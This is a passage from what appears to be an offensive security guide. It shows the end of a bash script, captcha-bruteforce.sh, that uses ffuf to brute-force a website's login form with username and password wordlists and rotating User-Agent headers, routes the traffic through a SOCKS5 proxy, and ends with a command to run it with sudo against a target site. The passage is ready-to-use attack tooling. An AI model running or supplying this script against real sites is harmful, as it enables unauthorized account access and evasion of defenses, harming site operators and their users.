         -H "User-Agent:FUZZ3" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UA:FUZZ3" \
         -x "socks5://127.0.0.1:16379" \
         -X POST -d "$DATA" \
         -ac -c -r -mc 200 \
         -H "User-Agent:FUZZ3" \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x captcha-bruteforce.sh;sudo ./captcha-bruteforce.sh $WEBSITE
```
